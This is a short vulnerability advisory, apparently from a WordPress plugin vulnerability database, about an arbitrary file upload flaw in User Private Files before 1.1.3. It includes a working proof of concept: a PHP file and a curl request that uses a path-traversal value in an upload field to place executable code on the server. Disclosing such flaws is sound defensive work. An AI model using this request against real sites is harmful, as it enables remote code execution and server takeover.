## WordPress Plugin Vulnerabilities

# User Private Files < 1.1.3 - Subscriber+ Arbitrary File Upload

### Description

The plugin does not filter file extensions when letting users upload files on the server, which may lead to malicious code being uploaded.

### Proof of Concept

1) Create a file named exploit.php, which contains: <?php phpinfo();
2) Find the upf\_ajax\_nonce on the site's front page.
2) Run the following cURL request,
curl --url 'http://vulnerable-site.tld/wp-admin/admin-ajax.php' -b 'YOUR COOKIES' -F 'docfile=@exploit.php' -F 'docext=/../../exploit.php' -F 'doc\_type=doc/pdf' -F 'action=upload\_doc\_callback' -F 'upf\_nonce=YOUR NONCE'
# You can find the uploaded PHP file at: https://target/blog/wp-content/uploads/exploit.php
